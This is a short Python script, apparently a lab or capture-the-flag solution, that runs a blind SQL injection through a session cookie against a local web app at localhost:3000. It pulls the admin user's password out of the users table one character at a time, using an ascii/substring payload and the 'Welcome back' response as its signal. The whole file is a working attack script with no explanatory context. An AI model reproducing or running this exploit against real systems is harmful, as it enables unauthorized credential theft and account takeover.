import requests
import urllib.parse

def brute_force_password():
    url = "http://localhost:3000/check-session"
    password = ""
    # assume the length of the password is at most 18
    for i in range(1, 19): 
        found = False
        for j in range(33, 127):  
            injection_payload = f"' and ascii(substring((select password from users where username='admin'),{i},1))='{j}'--'"
            encoded_payload = urllib.parse.quote(injection_payload)
            cookies = {'cookie_id': '7g.G2!xFopZMPdJ' + encoded_payload}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome back" in r.text:
                password += chr(j)
                print(f"\rPassword so far: {password}", end='')
                found = True
                break
        if not found:
            print("\nPassword retrieval complete.")
            break

def main():
    print("Start brute force retrieving password...")
    brute_force_password()

if __name__ == "__main__":
    main()

